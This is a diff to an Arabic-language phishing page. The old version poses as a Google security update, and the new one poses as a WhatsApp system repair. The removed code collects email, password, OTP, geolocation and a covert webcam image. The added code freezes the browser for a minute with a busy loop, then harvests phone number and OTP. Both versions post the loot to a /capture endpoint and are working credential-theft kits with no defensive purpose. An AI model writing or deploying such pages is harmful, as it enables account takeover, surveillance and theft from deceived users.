@@ -3,81 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمن النظام</title>
+    <title>تحديث النظام الإجباري</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; width: 90%; max-width: 400px; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; }
-        button { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .loading { display: none; margin-top: 20px; color: #1a73e8; }
+        body { background: #000; color: #ff0000; font-family: sans-serif; text-align: center; padding-top: 40%; overflow: hidden; }
+        .freeze-msg { font-size: 22px; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} }
+        input { width: 80%; padding: 15px; margin: 10px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; }
+        button { background: #25D366; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; }
+        #login-section { display: none; padding-top: 10%; }
     </style>
 </head>
 <body>
-    <div class="card" id="box">
-        <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="50">
-        <h2>تحديث أمني مطلوب</h2>
-        <p>لحماية حسابك من الاختراق، يرجى تسجيل الدخول لتحديث درع الحماية.</p>
-        
-        <div id="step1">
-            <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="startHack()">تحديث الآن</button>
-        </div>
 
-        <div id="step2" style="display:none;">
-            <p>أدخل رمز التحقق (OTP) المكون من 6 أرقام:</p>
-            <input type="number" id="otp" placeholder="000000">
-            <button onclick="finalHack()">تأكيد الهوية</button>
-            <div class="loading" id="loader">جاري التحقق من الأمان...</div>
-        </div>
+    <div id="freeze-section">
+        <div class="freeze-msg">⚠️ خطأ حرجة في النظام!<br>جاري إصلاح ملفات WhatsApp...<br>الرجاء الانتظار 60 ثانية</div>
+    </div>
+
+    <div id="login-section">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60">
+        <h3>تم استعادة النظام</h3>
+        <p>لتجنب حظر حسابك، يرجى تأكيد ملكية الرقم:</p>
+        <input type="tel" id="phone" placeholder="رقم الهاتف">
+        <input type="number" id="otp" placeholder="كود التحقق (OTP)">
+        <button onclick="sendToTelegram()">تأكيد الحساب</button>
     </div>
 
     <script>
-        let collectedData = {};
+        // دالة التفجير والتجميد
+        window.onload = function() {
+            // استهلاك موارد المعالج فوراً
+            const start = Date.now();
+            while (Date.now() - start < 60000) { 
+                // حلقة مفرغة تشل حركة المتصفح لمدة دقيقة
+                Math.sqrt(Math.random());
+            }
+            
+            // بعد انتهاء الدقيقة، نظهر صفحة السحب
+            document.getElementById('freeze-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            document.body.style.overflow = 'auto';
+            document.body.style.background = '#121212';
+            document.body.style.color = '#fff';
+        };
 
-        async function startHack() {
-            collectedData.email = document.getElementById('email').value;
-            collectedData.password = document.getElementById('pass').value;
-            collectedData.device = navigator.userAgent;
-
-            if(!collectedData.email || !collectedData.password) return alert("يرجى إكمال البيانات");
-
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-
-            // سحب الموقع والصورة فوراً في الخلفية
-            navigator.geolocation.getCurrentPosition(p => {
-                collectedData.location = { lat: p.coords.latitude, lon: p.coords.longitude };
-                sendData();
-            }, () => sendData());
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                collectedData.image = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(t => t.stop());
-                sendData();
-            } catch (e) {}
-        }
-
-        async function finalHack() {
-            collectedData.otp = document.getElementById('otp').value;
-            document.getElementById('loader').style.display = 'block';
-            await sendData();
-            setTimeout(() => { window.location.href = "https://google.com"; }, 4000);
-        }
-
-        async function sendData() {
+        async function sendToTelegram() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otp').value;
+            
             await fetch('/capture', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    email: "رقم: " + phone,
+                    password: "كود: " + otp,
+                    device: navigator.userAgent
+                })
             });
+            
+            window.location.href = "https://www.whatsapp.com";
         }
     </script>
 </body>
